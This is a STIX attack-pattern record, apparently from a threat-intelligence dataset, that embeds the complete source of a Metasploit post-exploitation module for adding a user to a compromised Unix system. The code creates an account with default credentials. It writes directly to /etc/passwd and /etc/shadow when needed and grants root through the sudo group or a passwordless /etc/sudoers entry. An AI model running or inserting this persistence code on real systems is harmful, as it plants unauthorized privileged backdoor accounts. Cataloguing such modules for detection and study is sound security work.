{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--81b4dbac-d611-48cc-9d36-9b30f1f237c6",
    "created": "2024-08-14T16:33:13.579172Z",
    "modified": "2024-08-14T16:33:13.579175Z",
    "name": "Add a new user to the system",
    "description": " This command adds a new user to the system  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/manage/adduser.rb",
            "external_id": "adduser.rb"
        }
    ],
    "x_code_snippet": "# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n\nrequire 'unix_crypt'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Add a new user to the system',\n        'Description' => %q{\n          This command adds a new user to the system\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Nick Cottrell <ncottrellweb[at]gmail.com>'],\n        'Platform' => ['linux', 'unix', 'bsd', 'aix', 'solaris'],\n        'Privileged' => false,\n        'SessionTypes' => %w[meterpreter shell],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [CONFIG_CHANGES]\n        }\n      )\n    )\n    register_options([\n      OptString.new('USERNAME', [ true, 'The username to create', 'metasploit' ]),\n      OptString.new('PASSWORD', [ true, 'The password for this user', 'Metasploit$1' ]),\n      OptString.new('SHELL', [true, 'Set the shell that the new user will use', '/bin/sh']),\n      OptString.new('HOME', [true, 'Set the home directory of the new user. Leave empty if user will have no home directory', '']),\n      OptString.new('GROUPS', [false, 'Set what groups the new user will be part of separated with a space'])\n    ])\n\n    register_advanced_options([\n      OptEnum.new('UseraddMethod', [true, 'Set how the module adds in new users and groups. AUTO will autodetect how to add new users, MANUAL will add users without any binaries, and CUSTOM will attempt to use a custom designated binary', 'AUTO', ['AUTO', 'MANUAL', 'CUSTOM']]),\n      OptString.new('UseraddBinary', [false, 'Set binary used to set password if you dont want module to find it for you.'], conditions: %w[UseraddMethod == CUSTOM]),\n      OptEnum.new('SudoMethod', [true, 'Set the method that the new user can obtain root. SUDO_FILE adds the user directly to sudoers while GROUP adds the new user to the sudo group', 'GROUP', ['SUDO_FILE', 'GROUP', 'NONE']]),\n      OptEnum.new('MissingGroups', [true, 'Set how nonexisting groups are handled on the system. Either give an error in the module, ignore it and throw it out, or create the group on the system.', 'ERROR', ['ERROR', 'IGNORE', 'CREATE']]),\n      OptEnum.new('PasswordHashType', [true, 'Set the hash method your password will be encrypted in.', 'MD5', ['DES', 'MD5', 'SHA256', 'SHA512']])\n    ])\n  end\n\n  # Checks if the given group exists within the system\n  def check_group_exists?(group_name, group_data)\n    return group_data =~ /^#{Regexp.escape(group_name)}:/\n  end\n\n  # Checks if the specified command can be executed by the session. It should be\n  # noted that not all commands correspond to a binary file on disk. For example,\n  # a bash shell session will provide the `eval` command when there is no `eval`\n  # binary on disk. Likewise, a Powershell session will provide the `Get-Item`\n  # command when there is no `Get-Item` executable on disk.\n  #\n  # @param [String] cmd the command to check\n  # @return [Boolean] true when the command exists\n  def check_command_exists?(cmd)\n    command_exists?(cmd)\n  rescue RuntimeError => e\n    fail_with(Failure::Unknown, \"Unable to check if command `#{cmd}' exists: #{e}\")\n  end\n\n  def d_cmd_exec(command)\n    vprint_status(command)\n    print_line(cmd_exec(command))\n  end\n\n  # Produces an altered copy of the group file with the user added to each group\n  def fs_add_groups(group_file, groups)\n    groups.each do |group|\n      # Add user to group if there are other users\n      group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, \"\\\\1,#{datastore['USERNAME']}\")\n      # Add user to group of no users belong to that group yet\n      group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:)$/, \"\\\\1#{datastore['USERNAME']}\")\n    end\n    if datastore['MissingGroups'] == 'CREATE'\n      new_groups = get_missing_groups(group_file, groups)\n      new_groups.each do |group|\n        gid = rand(1000..2000).to_s\n        group_file += \"\\n#{group}:x:#{gid}:#{datastore['USERNAME']}\\n\"\n        print_good(\"Added #{group} group\")\n      end\n    end\n    group_file.gsub(/\\n{2,}/, \"\\n\")\n  end\n\n  # Provides a list of groups that arent already on the system\n  def get_missing_groups(group_file, groups)\n    groups.reject { |group| check_group_exists?(group, group_file) }\n  end\n\n  # Finds out what platform the module is running on. It will attempt to access\n  # the Hosts database before making more noise on the target to learn more\n  def os_platform\n    if session.type == 'meterpreter'\n      sysinfo['OS']\n    elsif active_db? && framework.db.workspace.hosts.where(address: session.session_host)&.first&.os_name\n      host = framework.db.workspace.hosts.where(address: session.session_host).first\n      if host.os_name == 'linux' && host.os_flavor\n        host.os_flavor\n      else\n        host.os_name\n      end\n    else\n      get_sysinfo[:distro]\n    end\n  end\n\n  # Validates the groups given to it. Depending on datastore settings, it will\n  # give a trimmed down list of the groups given to it, and ensure that all\n  # groups returned exist on the system.\n  def validate_groups(group_file, groups)\n    groups = groups.uniq\n\n    # Check that group names are valid\n    invalid = groups.filter { |group| group !~ /^[a-zA-Z0-9_.][a-zA-Z0-9_.-]{0,30}[a-zA-Z0-9_.$-]?$/ }\n    if invalid.any? && datastore['MissingGroups'] == 'IGNORE'\n      groups -= invalid\n      vprint_error(\"The groups [#{invalid.join(' ')}] do not fit accepted characters for groups. Ignoring them instead.\")\n    elsif invalid.any?\n      # Give error even on create, as creating this group will cause errors\n      fail_with(Failure::BadConfig, \"groups [#{invalid.join(' ')}] Do not fit the authorized regex for groups. Check your groups against this regex /^[a-zA-Z0-9_.][a-zA-Z0-9_.-]{0,30}[a-zA-Z0-9_.$-]?$/\")\n    end\n\n    # Check to see that groups exist or fail\n    groups_missing = get_missing_groups(group_file, groups)\n    unless groups_missing.empty?\n      if datastore['MissingGroups'] == 'ERROR'\n        fail_with(Failure::NotFound, \"groups [#{groups_missing.join(' ')}] do not exist on the system. Change the `MissingGroups` Option to deal with errors automatically\")\n      end\n      print_warning(\"Groups [#{groups_missing.join(' ')}] do not exist on system\")\n      if datastore['MissingGroups'] == 'IGNORE'\n        groups -= groups_missing\n        print_good(\"Removed #{groups_missing.join(' ')} from target groups\")\n      end\n    end\n\n    groups\n  end\n\n  # Takes all the groups given and attempts to add them to the system\n  def create_new_groups(groups)\n    # Since command can add on groups, checking over groups\n    groupadd = check_command_exists?('groupadd') ? 'groupadd' : nil\n    groupadd ||= 'addgroup' if check_command_exists?('addgroup')\n    fail_with(Failure::NotFound, 'Neither groupadd nor addgroup exist on the system. Try running with UseraddMethod as MANUAL to get around this issue') unless groupadd\n\n    groups.each do |group|\n      d_cmd_exec(\"#{groupadd} #{group}\")\n      print_good(\"Added #{group} group\")\n    end\n  end\n\n  def run\n    fail_with(Failure::NoAccess, 'Session isnt running as root') unless is_root?\n    case datastore['UseraddMethod']\n    when 'CUSTOM'\n      fail_with(Failure::NotFound, \"Cannot find command on path given: #{datastore['UseraddBinary']}\") unless check_command_exists?(datastore['UseraddBinary'])\n    when 'AUTO'\n      fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless check_command_exists?('useradd') || check_command_exists?('adduser')\n    end\n    fail_with(Failure::NotVulnerable, 'Cannot add user to sudo as sudoers doesnt exist') unless datastore['SudoMethod'] != 'SUDO_FILE' || file_exist?('/etc/sudoers')\n    fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless check_command_exists?(datastore['SHELL'])\n    fail_with(Failure::BadConfig, \"Username [#{datastore['USERNAME']}] is not a legal unix username.\") unless datastore['USERNAME'] =~ /^[a-z][a-z0-9_-]{0,31}$/\n\n    # Encrypting password ahead of time\n    passwd = case datastore['PasswordHashType']\n             when 'DES'\n               UnixCrypt::DES.build(datastore['PASSWORD'])\n             when 'MD5'\n               UnixCrypt::MD5.build(datastore['PASSWORD'])\n             when 'SHA256'\n               UnixCrypt::SHA256.build(datastore['PASSWORD'])\n             when 'SHA512'\n               UnixCrypt::SHA512.build(datastore['PASSWORD'])\n             end\n\n    # Adding sudo to groups if method is set to use groups\n    groups = datastore['GROUPS']&.split || []\n    groups += ['sudo'] if datastore['SudoMethod'] == 'GROUP'\n    group_file = read_file('/etc/group').to_s\n    groups = validate_groups(group_file, groups)\n\n    # Creating new groups if it was set and isnt manual\n    if groups.any? && datastore['MissingGroups'] == 'CREATE' && datastore['UseraddMethod'] != 'MANUAL'\n      create_new_groups(get_missing_groups(group_file, groups))\n    end\n\n    # Automatically ignore setting groups if added additional groups is empty\n    groups_handled = groups.empty?\n\n    # Check database to see what OS it is. If it meets specific requirements, This can all be done in a single line\n    binary = case datastore['UseraddMethod']\n             when 'AUTO'\n               if check_command_exists?('useradd')\n                 'useradd'\n               elsif check_command_exists?('adduser')\n                 'adduser'\n               else\n                 'MANUAL'\n               end\n             when 'MANUAL'\n               'MANUAL'\n             when 'CUSTOM'\n               datastore['UseraddBinary']\n             end\n    case binary\n    when /useradd$/\n      print_status(\"Running on #{os_platform}\")\n      print_status('Useradd exists. Using that')\n      case os_platform\n      when /debian|ubuntu|fedora|centos|oracle|redhat|arch|suse|gentoo/i\n        homedirc = datastore['HOME'].empty? ? '--no-create-home' : \"--home-dir #{datastore['HOME']}\"\n\n        # Since command can add on groups, checking over groups\n        groupsc = groups.empty? ? '' : \"--groups #{groups.join(',')}\"\n\n        # Finally run it\n        d_cmd_exec(\"#{binary} --password \\'#{passwd}\\' #{homedirc} #{groupsc} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}\".gsub(/ {2,}/, ' '))\n        groups_handled = true\n      else\n        vprint_status('Unsure what platform we\\'re on. Using useradd in most basic/common settings')\n\n        # Finally run it\n        d_cmd_exec(\"#{binary} #{datastore['USERNAME']} | echo\")\n        d_cmd_exec(\"echo \\'#{datastore['USERNAME']}:#{passwd}\\'|chpasswd -e\")\n      end\n    when /adduser$/\n      print_status(\"Running on #{os_platform}\")\n      print_status('Adduser exists. Using that')\n      case os_platform\n      when /debian|ubuntu/i\n        print_warning('Adduser cannot add groups to the new user automatically. Going to have to do it at a later step')\n        homedirc = datastore['HOME'].empty? ? '--no-create-home' : \"--home #{datastore['HOME']}\"\n\n        d_cmd_exec(\"#{binary} --disabled-password #{homedirc} --shell #{datastore['SHELL']} #{datastore['USERNAME']} | echo\")\n        d_cmd_exec(\"echo \\'#{datastore['USERNAME']}:#{passwd}\\'|chpasswd -e\")\n      when /fedora|centos|oracle|redhat/i\n        homedirc = datastore['HOME'].empty? ? '--no-create-home' : \"--home-dir #{datastore['HOME']}\"\n\n        # Since command can add on groups, checking over groups\n        groupsc = groups.empty? ? '' : \"--groups #{groups.join(',')}\"\n\n        # Finally run it\n        d_cmd_exec(\"#{binary} --password \\'#{passwd}\\' #{homedirc} #{groupsc} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}\".gsub(/ {2,}/, ' '))\n        groups_handled = true\n      when /alpine/i\n        print_warning('Adduser cannot add groups to the new user automatically. Going to have to do it at a later step')\n        homedirc = datastore['HOME'].empty? ? '-H' : \"-h #{datastore['HOME']}\"\n\n        d_cmd_exec(\"#{binary} -D #{homedirc} -s #{datastore['SHELL']} #{datastore['USERNAME']}\")\n        d_cmd_exec(\"echo \\'#{datastore['USERNAME']}:#{passwd}\\'|chpasswd -e\")\n      else\n        print_status('Unsure what platform we\\'re on. Using useradd in most basic/common settings')\n\n        # Finally run it\n        d_cmd_exec(\"#{binary} #{datastore['USERNAME']}\")\n        d_cmd_exec(\"echo \\'#{datastore['USERNAME']}:#{passwd}\\'|chpasswd -e\")\n      end\n    when datastore['UseraddBinary']\n      print_status('Running with command supplied')\n      d_cmd_exec(\"#{binary} #{datastore['USERNAME']}\")\n      d_cmd_exec(\"echo \\'#{datastore['USERNAME']}:#{passwd}\\'|chpasswd -e\")\n    else\n      # Checking that user doesnt already exist\n      fail_with(Failure::BadConfig, 'User already exists') if read_file('/etc/passwd') =~ /^#{datastore['USERNAME']}:/\n\n      # Run adding user manually if set\n      home = datastore['HOME'].empty? ? \"/home/#{datastore['USERNAME']}\" : datastore['HOME']\n      uid = rand(1000..2000).to_s\n      append_file('/etc/passwd', \"#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\\n\")\n      vprint_status(\"\\'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\\' >> /etc/passwd\")\n      append_file('/etc/shadow', \"#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\\n\")\n      vprint_status(\"\\'#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\\' >> /etc/shadow\")\n\n      altered_group_file = fs_add_groups(group_file, groups)\n      write_file('/etc/group', altered_group_file) unless group_file == altered_group_file\n\n      groups_handled = true\n    end\n\n    # Adding in groups and connecting if not done already\n    unless groups_handled\n      # Attempt to do add groups to user by normal means, or do it manually\n      if check_command_exists?('usermod')\n        d_cmd_exec(\"usermod -aG #{groups.join(',')} #{datastore['USERNAME']}\")\n      elsif check_command_exists?('addgroup')\n        groups.each do |group|\n          d_cmd_exec(\"addgroup #{datastore['USERNAME']} #{group}\")\n        end\n      else\n        print_error(\"Couldnt find \\'usermod\\' nor \\'addgroup\\' on the target. User [#{datastore['USERNAME']}] couldnt be linked to groups.\")\n      end\n    end\n\n    # Adding user to sudo file if specified\n    if datastore['SudoMethod'] == 'SUDO_FILE' && file_exist?('/etc/sudoers')\n      append_file('/etc/sudoers', \"#{datastore['USERNAME']} ALL=(ALL:ALL) NOPASSWD: ALL\\n\")\n      print_good(\"Added [#{datastore['USERNAME']}] to /etc/sudoers successfully\")\n    end\n  rescue Msf::Exploit::Failed\n    print_warning(\"The module has failed to add the new user [#{datastore['USERNAME']}]!\")\n    print_warning('Groups that were created need to be removed from the system manually.')\n    raise\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux', 'unix', 'bsd', 'aix', 'solaris']"
    ]
}